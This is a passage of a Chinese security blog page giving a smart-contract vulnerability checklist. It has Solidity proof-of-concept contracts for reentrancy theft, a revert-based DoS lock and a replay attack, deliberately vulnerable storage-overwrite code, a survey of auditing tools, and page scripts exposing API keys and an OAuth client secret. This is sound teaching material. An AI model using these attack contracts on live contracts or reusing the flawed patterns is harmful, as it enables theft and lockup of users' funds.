class="title">stopAttack</span>(<span class="params"></span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">startAttack</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        step1(amount);</span><br><span class="line">        step2(amount / <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (msg.sender == victim) &#123;</span><br><span class="line">            <span class="comment">// 再次尝试调用 IDMoney 的 withdraw 函数，递归转币</span></span><br><span class="line">            victim.call(bytes4(keccak256(<span class="string">"withdraw(address,uint256)"</span>)), <span class="keyword">this</span>, msg.value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意到合约IDMoney.withdraw()方法已经存在检查账户余额的代码，但是却未能生效，原因是递归调用时没有执行到<code>balances[msg.sender] -= amount;</code>，因此调用时，账户的余额是不变的，而真正导致递归调用退出的是<code>require(this.balance &gt;= amount);</code>，这也是为何调用结束后合约还剩下amount数量的以太币的原因。有人会问，如果把这句话删掉呢？我本以为合约会报错，但是很遗憾，合约依然能够正常运行，并且合约中不再剩下任何以太币。</p>
+<h1 id="DoS攻击DoS"><a href="#DoS攻击DoS" class="headerlink" title="DoS攻击DoS"></a>DoS攻击<sup><a href="#fn_DoS" id="reffn_DoS">DoS</a></sup></h1><p>频繁调用某些Op(EXTCODESIZE和SUICIDE)，这些Op花费的Gas小，但是需要大量资源（计算资源，I/O），以此造成DoS，对以太坊合约进行 DoS 攻击，可能导致 Ether 和 Gas 的大量消耗，更严重的是让原本的合约代码逻辑无法正常运行。</p>
+<p>复现：</p>
+<ol>
+<li>账户A部署PresidentOfCountry合约设置_price为1e18（1ether）。</li>
+<li>账户B调用PresidentOfCountry，并附加1ether，成为President，price=2ether</li>
+<li>账户C部署Attack，调用start_attack(address(PresidentOfCountry))并附加2ether，账户C成为President。</li>
+<li>账户B调用PresidentOfCountry，并附加4ether，由于B要成为president,，需要调用PresidentOfCountry合约的becomePresident()函数，该函数会通过 transfer() 把ETH退回给之前的president，即Attack合约地址，但是因为Attacker的回退函数revert()抛异常==&gt;transfer()抛异常==&gt;becomePresident()抛异常，故而账户B永远无法成为president了。</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract PresidentOfCountry &#123;</span><br><span class="line">    address public president;</span><br><span class="line">    uint256 public price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(uint256 _price) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(_price &gt; <span class="number">0</span>);</span><br><span class="line">        price = _price;</span><br><span class="line">        president = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">becomePresident</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        assert(msg.value &gt;= price);  <span class="comment">// must pay the price to become president</span></span><br><span class="line">        president.transfer(price);   <span class="comment">// we pay the previous president</span></span><br><span class="line">        president = msg.sender;      <span class="comment">// we crown the new president</span></span><br><span class="line">        price = msg.value * <span class="number">2</span>;           <span class="comment">// we double the price to become president</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; revert(); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">start_attack</span>(<span class="params">address _target</span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        _target.call.value(msg.value)(bytes4(keccak256(<span class="string">"becomePresident()"</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="重放攻击blackhat2018"><a href="#重放攻击blackhat2018" class="headerlink" title="重放攻击blackhat2018"></a>重放攻击<sup><a href="#fn_blackhat2018" id="reffn_blackhat2018">blackhat2018</a></sup></h1><p>如果合约存在相同的代码，则攻击者可以使用合约A函数的参数调用合约B。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 付款人要为收款人转账，但是付款人没有足够的ETH，因此找一个代理人，并支付一定的代币作为代理费</span></span><br><span class="line"><span class="comment"> * @param _from     付款人</span></span><br><span class="line"><span class="comment"> * @param _to       收款人</span></span><br><span class="line"><span class="comment"> * @param _value    金额</span></span><br><span class="line"><span class="comment"> * @param feeUgt    代理费</span></span><br><span class="line"><span class="comment"> * @param _v        sig[0:66] #由付款人签名，即付款人确认付钱</span></span><br><span class="line"><span class="comment"> * @param _r        sig[66:130]</span></span><br><span class="line"><span class="comment"> * @param _s        sig[130:132]</span></span><br><span class="line"><span class="comment"> * 如果其他合约同样包含TransferProxy函数，并且实现相似，那么攻击者可以在B合约上重放函数参数，B合约会执行成功</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferProxy</span>(<span class="params">address _from, address _to, uint256 _value, uint256 _feeUgt,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint8 _v,bytes32 _r, bytes32 _s</span>) <span class="title">returns</span> (<span class="params">bool</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(balances[_from] &lt; _feeUgt + _value) <span class="keyword">throw</span>;</span><br><span class="line"></span><br><span class="line">    uint256 nonce = nonces[_from];</span><br><span class="line">    bytes32 h = sha3(_from,_to,_value,_feeUgt,nonce);</span><br><span class="line">    <span class="comment">// ecrecover 验签函数</span></span><br><span class="line">    <span class="keyword">if</span>(_from != ecrecover(h,_v,_r,_s)) <span class="keyword">throw</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(balances[_to] + _value &lt; balances[_to]</span><br><span class="line">        || balances[msg.sender] + _feeUgt &lt; balances[msg.sender]) <span class="keyword">throw</span>;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    Transfer(_from, _to, _value);</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] += _feeUgt;</span><br><span class="line">    Transfer(_from, msg.sender, _feeUgt);</span><br><span class="line"></span><br><span class="line">    balances[_from] -= _value + _feeUgt;</span><br><span class="line">    nonces[_from] = nonce + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="变量覆盖varreplace"><a href="#变量覆盖varreplace" class="headerlink" title="变量覆盖varreplace"></a>变量覆盖<sup><a href="#fn_varreplace" id="reffn_varreplace">varreplace</a></sup></h1><p>以如下代码为例，Solidity存储机制的问题，p初始化后的name、mappedAddress地址会与变量testA、testB地址重合，导致调用test函数给结构体p赋值后，变量testA和testB的值也会被覆盖。</p>
+<p>复现：</p>
+<ol>
+<li>调用TestContract.test()方法</li>
+<li>检查testA和testB的值，已被改变</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.0</span>;</span><br><span class="line">contract  TestContract&#123;</span><br><span class="line"></span><br><span class="line">    int public testA;</span><br><span class="line">    address public testB;</span><br><span class="line"></span><br><span class="line">    struct Person &#123;</span><br><span class="line">        int name;</span><br><span class="line">        address mappedAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">int _name, address _mappedAddress</span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        Person p;</span><br><span class="line">        p.name = _name;    <span class="comment">//testA被改变</span></span><br><span class="line">        p.mappedAddress = _mappedAddress;    <span class="comment">//testB被改变</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h1><ul>
+<li><p>DASP<sup><a href="#fn_dasp" id="reffn_dasp">dasp</a></sup>总结了以太坊合约的Top10安全性问题</p>
+</li>
+<li><p>luu等人<sup><a href="#fn_smarter" id="reffn_smarter">smarter</a></sup>设计一套基于符号执行的智能合约安全审计工具oyente（已做过演示，目前可以检测的漏洞有<strong>整形溢出，合约依赖交易顺序，依赖时间戳的漏洞，未处理异常和重入漏洞</strong>。</p>
+</li>
+<li><p>Nikolic<sup><a href="#fn_maian" id="reffn_maian">maian</a></sup>等人设计了一套符号执行检测智能合约的工具MAIAN，这些问题包括<strong>合约永久锁定资金，资金可被恶意用户转账以及被任意用户杀死</strong>，我们选用了34200个合约（去重复后有2365个），我们抽样调查了3759个合约，得到89%的正确率。</p>
+</li>
+<li><p>jiang等人<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup>设计了一套基于fuzz的智能合约审计工具ContractFuzzer，他们通过在EVM中插桩，以此获取程序在执行中产生的信息，通过预先设置的测试准则发现漏洞，他们设计的工具可以检测<strong>无Gas发送、Exception Disorder、重入漏洞、依赖于时间戳漏洞、依赖于区块高度漏洞、危险的Delegatecall、合约永久锁定资金</strong>7大安全性问题，经过试验，ContractFuzzer发现漏洞的准确率较高，但是相较于Oyente，此工具找到的漏洞数量较少。</p>
+</li>
+<li><p>Liu等人<sup><a href="#fn_ReGuard" id="reffn_ReGuard">ReGuard</a></sup>构建了基于fuzz的智能合约检测工具，旨在检测合约中的<strong>重入漏洞</strong>，实验表明，相较于Oyente，该工具有更高的准确率，并且能发现更多数量的问题。</p>
+</li>
+<li><p>chen等人<sup><a href="#fn_DoS" id="reffn_DoS">DoS</a></sup>通过动态调整Op执行的gas花费阻止DoS攻击（通过反复执行小gas的opcode，消耗系统资源造成dos）。</p>
+</li>
+</ul>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><blockquote id="fn_DoS">
+<sup>DoS</sup>. Chen, Ting, et al. “An Adaptive Gas Cost Mechanism for Ethereum to Defend Against Under-Priced DoS Attacks.” <em>International Conference on Information Security Practice and Experience</em>. Springer, Cham, 2017.<a href="#reffn_DoS" title="Jump back to footnote [DoS] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_smarter">
+<sup>smarter</sup>. Luu, Loi, et al. “Making smart contracts smarter.” Proceedings of the 2016 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2016.<a href="#reffn_smarter" title="Jump back to footnote [smarter] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_blackhat2018">
+<sup>blackhat2018</sup>. Bai, Zhenxuan, et al. “Your May Have Paid More than You Imagine：Replay Attacks on Ethereum Smart Contracts.” Blackhat. 2018<a href="#reffn_blackhat2018" title="Jump back to footnote [blackhat2018] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_seebug1">
+<sup>seebug1</sup>. 以太坊智能合约安全入门了解一下（上）, <a href="https://paper.seebug.org/601/" target="_blank" rel="noopener">https://paper.seebug.org/601/</a><a href="#reffn_seebug1" title="Jump back to footnote [seebug1] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_contractfuzzer">
+<sup>contractfuzzer</sup>. Bo Jiang, Ye Liu, and W.K. Chan. 2018. ContractFuzzer: Fuzzing Smart Contracts for Vulnerability Detection. In Proceedings ofthe 33rd IEEE/ACM International Conference on Automated Software Engineering (ASE’18), September 3–7, Montpellier, France, 10 pages.<a href="#reffn_contractfuzzer" title="Jump back to footnote [contractfuzzer] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_varreplace">
+<sup>varreplace</sup>. Solidity中存储方式错误使用所导致的变量覆盖，<a href="http://www.freebuf.com/articles/blockchain-articles/175237.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/blockchain-articles/175237.html</a><a href="#reffn_varreplace" title="Jump back to footnote [varreplace] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_maian">
+<sup>maian</sup>. Ivica Nikolic, Aashish Kolluri, Ilya Sergey, Prateek Saxena, and Aquinas Hobor. 2018. Finding The Greedy, Prodigal, and Suicidal Contracts at Scale. (2018). DOI:<a href="https://doi.org/arXiv:1802.06038v1" target="_blank" rel="noopener">https://doi.org/arXiv:1802.06038v1</a><a href="#reffn_maian" title="Jump back to footnote [maian] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_ReGuard">
+<sup>ReGuard</sup>. Liu, C., Liu, H., Cao, Z., Chen, Z., Chen, B., &amp; Roscoe, B. (2018). ReGuard: Finding reentrancy bugs in smart contracts. Proceedings - International Conference on Software Engineering, 65–68. <a href="https://doi.org/10.1145/3183440.3183495" target="_blank" rel="noopener">https://doi.org/10.1145/3183440.3183495</a><a href="#reffn_ReGuard" title="Jump back to footnote [ReGuard] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_dasp">
+<sup>dasp</sup>. <a href="http://www.dasp.co/" target="_blank" rel="noopener">http://www.dasp.co/</a><a href="#reffn_dasp" title="Jump back to footnote [dasp] in the text."> &#8617;</a>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Anemone</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://anemone.top/blockchain-智能合约checklist/" title="智能合约Checklist">http://anemone.top/blockchain-智能合约checklist/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/源码安全/" rel="tag"># 源码安全</a>
+            
+              <a href="/tags/区块链/" rel="tag"># 区块链</a>
+            
+              <a href="/tags/智能合约/" rel="tag"># 智能合约</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/ctf-2018网鼎杯二叉树-martrickswp/" rel="next" title="2018网鼎杯二叉树&martricks wp">
+                  <i class="fa fa-chevron-left"></i> 2018网鼎杯二叉树&martricks wp
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/ctf-2018安恒9月赛babybypass复现-无字母数字的webshell思考/" rel="prev" title="2018安恒9月赛babybypass复现&无字母数字的webshell思考">
+                  2018安恒9月赛babybypass复现&无字母数字的webshell思考 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#整形溢出-Arithmetic-Issues"><span class="nav-number">1.</span> <span class="nav-text">整形溢出(Arithmetic Issues)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#危险的delegatecall-dangerous-delegatecall-contractfuzzer"><span class="nav-number">2.</span> <span class="nav-text">危险的delegatecall(dangerous delegatecall)contractfuzzer</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#无Gas发送-Gasless-Send-contractfuzzer"><span class="nav-number">3.</span> <span class="nav-text">无Gas发送(Gasless Send)contractfuzzer</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#依赖于交易顺序-条件竞争-TOD-Front-Running-smarter"><span class="nav-number">4.</span> <span class="nav-text">依赖于交易顺序/条件竞争(TOD/Front Running)smarter</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#依赖于时间戳-Timestamp-Dependence-Time-manipulation-contractfuzzer"><span class="nav-number">5.</span> <span class="nav-text">依赖于时间戳(Timestamp Dependence/Time manipulation)contractfuzzer</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#依赖于区块号-BlockNumber-Dependency-contractfuzzer"><span class="nav-number">6.</span> <span class="nav-text">依赖于区块号(BlockNumber Dependency)contractfuzzer</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ExceptionDisordercontractfuzzer"><span class="nav-number">7.</span> <span class="nav-text">ExceptionDisordercontractfuzzer</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#未处理的异常-Mishandled-Exceptions-Unchecked-Return-Values-For-Low-Level-Calls-smarter"><span class="nav-number">8.</span> <span class="nav-text">未处理的异常(Mishandled Exceptions/Unchecked Return Values For Low Level Calls)smarter</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#重入漏洞-Reentrancy-DAO-seebug1"><span class="nav-number">9.</span> <span class="nav-text">重入漏洞(Reentrancy/DAO)seebug1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DoS攻击DoS"><span class="nav-number">10.</span> <span class="nav-text">DoS攻击DoS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#重放攻击blackhat2018"><span class="nav-number">11.</span> <span class="nav-text">重放攻击blackhat2018</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#变量覆盖varreplace"><span class="nav-number">12.</span> <span class="nav-text">变量覆盖varreplace</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#相关工作"><span class="nav-number">13.</span> <span class="nav-text">相关工作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文献"><span class="nav-number">14.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.jpg"
+      alt="Anemone">
+  <p class="site-author-name" itemprop="name">Anemone</p>
+  <div class="site-description" itemprop="description">关注Web安全、移动安全、Fuzz测试和机器学习</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">70</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/anemone95" title="GitHub &rarr; https://github.com/anemone95" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:anemone95@qq.com" title="E-Mail &rarr; mailto:anemone95@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">anemone</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+  
+  <script>
+  function leancloudSelector(url) {
+    return document.getElementById(url).querySelector('.leancloud-visitors-count');
+  }
+  if (CONFIG.page.isPost) {
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = visitors.getAttribute('id').trim();
+      var title = visitors.getAttribute('data-flag-title').trim();
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .then(response => response.json())
+              .then(() => {
+                leancloudSelector(url).innerText = counter.time + 1;
+              })
+            
+              .catch(error => {
+                console.log('Failed to save visitor count', error);
+              })
+          } else {
+              Counter('post', '/classes/Counter', { title: title, url: url, time: 1 })
+                .then(response => response.json())
+                .then(() => {
+                  leancloudSelector(url).innerText = 1;
+                })
+                .catch(error => {
+                  console.log('Failed to create', error);
+                });
+            
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  } else {
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return element.getAttribute('id').trim();
+      });
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url: { '$in': entries } })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length === 0) {
+            document.querySelectorAll('.leancloud_visitors .leancloud-visitors-count').forEach(element => {
+              element.innerText = 0;
+            });
+            return;
+          }
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.url;
+            var time = item.time;
+            leancloudSelector(url).innerText = time;
+          }
+          for (var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = leancloudSelector(url);
+            if (element.innerText == '') {
+              element.innerText = 0;
+            }
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  }
+
+  fetch('https://app-router.leancloud.cn/2/route?appId=o5UaCJdPfEG0g7MVxXSMagpT-gzGzoHsz')
+    .then(response => response.json())
+    .then(({ api_server }) => {
+      var Counter = (method, url, data) => {
+        return fetch(`https://${api_server}/1.1${url}`, {
+          method: method,
+          headers: {
+            'X-LC-Id': 'o5UaCJdPfEG0g7MVxXSMagpT-gzGzoHsz',
+            'X-LC-Key': 'c6IN1PuMV3QPltJcrHfn74Gt',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        const localhost = /http:\/\/(localhost|127.0.0.1|0.0.0.0)/;
+        if (localhost.test(document.URL)) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.1.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css">
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.js"></script><script src="/js/algolia-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme: 'forest',
+      logLevel: 3,
+      flowchart: { curve: 'linear' },
+      gantt: { axisFormat: '%m/%d/%Y' },
+      sequence: { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID: 'f3075553d7b0225df6ca',
+      clientSecret: '68362ba87c4cc8e13103afcf729f5bd8ea176a78',
+      repo: 'anemone95.github.io',
+      owner: 'Anemone95',
+      admin: ['Anemone95'],
+      id: 'c9859ab4da76b2596ab5d5c5db8dae69',
+        language: window.navigator.language || window.navigator.userLanguage,
+      
+      distractionFreeMode: 'true'
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+</script>
+
+</body>
+</html>
